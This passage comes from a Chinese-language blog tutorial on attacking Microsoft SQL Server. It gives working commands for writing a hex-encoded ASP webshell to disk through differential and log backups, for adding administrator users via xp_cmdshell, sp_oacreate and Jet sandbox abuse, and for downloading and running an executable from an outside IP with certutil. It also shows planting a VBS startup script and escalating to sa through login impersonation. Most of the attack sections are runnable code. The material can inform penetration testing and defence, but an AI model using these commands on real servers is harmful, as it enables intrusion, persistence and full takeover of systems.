</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\bak.bak&#39;</span><span class="p">;</span><span class="c1">--
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">test</span><span class="p">]</span><span class="w"> </span><span class="p">([</span><span class="n">cmd</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">image</span><span class="p">]);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">创建表</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="err">并插入一句话木马</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">test</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">进行差异备份</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="o">=</span><span class="s1">&#39;C:\d.asp&#39;</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">DIFFERENTIAL</span><span class="p">,</span><span class="n">FORMAT</span><span class="p">;</span><span class="c1">--
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>差异备份有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到 c 盘根目录</p>
<p>当过滤了特殊的字符比如单引号，或者路径符号都可以使用前面提到的定义局部变量来执行。</p>
<h4 id="513-log-备份">5.1.3 LOG 备份</h4>
<blockquote>
<p>LOG 备份需要先把指定的数据库激活为还原模式，所以需要执行<code>alter database XXX set RECOVERY FUL</code>，而差异备份不需要，所以只有这条语句的就是 LOG 备份</p>
</blockquote>
<p>LOG 备份的要求是目标机器的数据库备份过，而且选择恢复模式得是完整模式，但是使用 log 备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">RECOVERY</span><span class="w"> </span><span class="k">FULL</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="n">image</span><span class="p">)</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx&#39;</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">init</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx\2.asp&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>相对于差异备份，log 备份的好处就是备份出来的 webshell 的文件大小非常的小。</p>
<h3 id="52-xp_cmdshell">5.2 xp_cmdshell</h3>
<ul>
<li>
<p>测试 xp_cmdshell 是否可以执行</p>
<ul>
<li><code>exec master..xp_cmdshell 'ver'</code></li>
</ul>
</li>
<li>
<p>添加管理员用户</p>
<ul>
<li><code>exec master.dbo.xp_cmdshell 'net user q 123456q /add'</code></li>
<li><code>exec master.dbo.xp_cmdshell 'net localgroup administrators q /add'</code></li>
</ul>
</li>
<li>
<p>远程下载文件，上马</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; file.exe&#39;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="53-sp_oacreate">5.3 sp_oacreate</h3>
<p>当 xp_cmdshell 被删除可以使用这个来提权试试，恢复 sp_oacreate</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;Ole Automation Procedures&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>sp_oacreate 是一个非常危险的存储过程可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行 cmd。</p>
<p>有以下几种利用思路：</p>
<ul>
<li>调用 cmd 来执行命令</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">wscript</span><span class="p">.</span><span class="n">shell</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;wscript.shell&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="k">output</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;run&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32\cmd.exe /c xxx&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Shell</span><span class="p">.</span><span class="n">Application</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="nb">int</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;Shell.Application&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="k">out</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ShellExecute&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;cmd.exe&#39;</span><span class="p">,</span><span class="s1">&#39;cmd /c net user &gt;c:\test.txt&#39;</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>写入启动项</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">t</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="nb">int</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;scripting.filesystemobject&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="k">out</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;createtextfile&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="k">out</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d:\RECYCLER\1.vbs&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;set wsnetwork=CreateObject(&#34;WSCRIPT.NETWORK&#34;)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;os=&#34;WinNT://&#34;&amp;wsnetwork.ComputerName&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set ob=GetObject(os)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set oe=GetObject(os&amp;&#34;/Administrators,group&#34;)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set od=ob.Create(&#34;user&#34;,&#34;123$&#34;)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetPassword &#34;123&#34;&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetInfo&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set of=GetObject(os&amp;&#34;/123$&#34;,user)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;oe.add os&amp;&#34;/123$&#34;&#39;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="54-沙盒提权">5.4 沙盒提权</h3>
<p>沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p>
<p>使用场景：无法执行命令时，<code>xp_regwrite</code> 可用(使用条件)</p>
<ul>
<li>开启沙盒模式：</li>
</ul>
<p><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1</code></p>
<p>SandBoxMode参数含义（默认是2）</p>
<p><code>0</code>：在任何所有者中禁止启用安全模式</p>
<p><code>1</code> ：为仅在允许范围内</p>
<p><code>2</code> ：必须在access模式下</p>
<p><code>3</code>：完全开启</p>
<ul>
<li>利用 jet.oledb 执行系统命令添加用户</li>
</ul>
<p><code>select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\windows\system32\ias\ias.mdb' ,'select shell(&quot;cmd.exe /c net user q 123456q /add&quot;)')</code></p>
<ul>
<li>将 q 用户添加至管理员组</li>
</ul>
<p><code>select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\windows\system32\ias\ias.mdb' ,'select shell(&quot;cmd.exe /c net localgroup administrators q /add&quot;)')</code></p>
<h3 id="55-利用-mssql-模拟登录提权">5.5 利用 mssql 模拟登录提权</h3>
<p>开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</p>
<h4 id="551-赋予用户-myuser1-权限来模拟-myuser2-myuser3及sa">5.5.1 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">USE master;
</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
</span></span><span class="line"><span class="cl">GO
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="552--查找可以模拟登录的用户">5.5.2  查找可以模拟登录的用户</h4>
<p>默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用 MyUser1 用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT distinct b.name
</span></span><span class="line"><span class="cl">FROM sys.server_permissions a
</span></span><span class="line"><span class="cl">INNER JOIN sys.server_principals b
</span></span><span class="line"><span class="cl">ON a.grantor_principal_id = b.principal_id
</span></span><span class="line"><span class="cl">WHERE a.permission_name = &#39;IMPERSONATE&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里我们可以看到 MyUser1 用户可以模拟登录 sa, MyUser2, MyUser2 用户，接下来就是模拟登录 sa 来获取 sysadmin 权限了</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195250.png-water_print" /></p>
<h4 id="553--模拟-sql-server-用户登陆">5.5.3  模拟 SQL Server 用户登陆</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="c1">-- 验证是否为sysadmin权限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 模拟sa登录
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">-- 验证是否为sysadmin权限
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120195349.png-water_print" /></p>
<h4 id="534-ps-工具化">5.3.4 PS 工具化</h4>
<p>当然这个也可以用 powershell 一键实现：<a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1" target="_blank" rel="noopener noreffer">脚本地址</a></p>
<h2 id="6-clr-提权">6 CLR 提权</h2>
<p>通过回顾常见的手法，可以看出，在目标系统该做安全防护都做了的情况下，除了备份拿 shell 之外，其它的操作均需要 sysadmin 服务器角色。</p>
<p>对于部分常见手法的防护，网上提出了一些极端的修复方法，比如将存储过程和其相关的 DLL 文件删除，其它功能可能删除，但是删除 CLR 可能性应该不大，且不论禁用或者删除 .net 之后 SQL Server 还能不能正常运行，SQL CLR 功能强大，开发也可能使用它开发正常功能，删除无异于自废武功。</p>
<h3 id="61-sql-server-clr-介绍">6.1 SQL Server CLR 介绍</h3>
<blockquote>
<p>公共语言运行库(Common Language Runtime，CLR)是整个 .NET 框架的核心，它为 .NET 应用程序提供了一个托管的代码执行环境。它实际上是驻留在内存里的一段代理代码， 负责应用程序在整个执行期间的代码管理工作，比较典型的有：内存管理、线程管理、安全管理、远程管理、即使编译、代码强制安全类检查等，这些都可以成为 .NET 框架的生命线。</p>
</blockquote>
<p>通俗来讲 CLR 就是 .NET 程序运行的基础。</p>
<p><strong>SQL Server 中的 CLR</strong></p>
<p>SQL CLR 是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，让 SQL Server 的部分数据库对象可以使用 .NET Framework 的编程语言进行开发(目前只支持VB.NET和C#)，包括存储过程、用户自定义函数、触发器、 用户自定义类型以及用户自定义聚合函数等功能。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210121100247.png-water_print" /></p>
<p>SQL Server 的 CLR 让我们可以用 C# 或者 VB 开发存储过程、用户自定义函数、触发器、用户自定义类型以及用户自定义聚合函数。但是我们最容易利用的是存储过程和触发器。触发器有 DDL 触发器和 DML 触发器两种，DDL 触发器对应的语句语句主要以 CREATE、ALTER 和 DROP 开头，DML 触发器对应的语句主要是 INSERT、UPDATE 或 DELETE，相比而言 DML 触发器更可控。</p>
<p>参考：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/8195" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/8195</a></li>
<li><a href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI" target="_blank" rel="noopener noreffer">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a></li>
<li><a href="https://data.hackinn.com/ppt/HackingDay2020online/SQL%20Server%e7%9a%84CLR%e5%9c%a8%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e4%b8%ad%e7%9a%84%e5%ba%94%e7%94%a8.pdf" target="_blank" rel="noopener noreffer">SQL Server的CLR在渗透测试中的应用</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-01-20</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
